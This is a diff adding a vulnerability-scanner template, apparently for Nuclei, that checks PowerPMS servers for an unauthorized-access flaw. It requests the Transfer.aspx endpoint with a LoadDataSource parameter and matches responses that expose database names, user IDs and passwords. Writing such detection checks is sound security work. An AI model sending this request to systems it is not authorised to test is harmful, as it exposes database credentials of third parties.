@@ -1,0 +1,28 @@
+id: powerpms-transfer-aspx-unauthorized-access
+info:
+  name: PowerPMS Transfer.aspx Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: unauthorized-access
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/PowerPlat/Tools/Transfer.aspx?ServerOperatorType=LoadDataSource"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"DataBaseCode\""
+          - "\"DataBaseName\":"
+          - "\"ServerName\":\""
+          - "User ID="
+          - "Password="
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
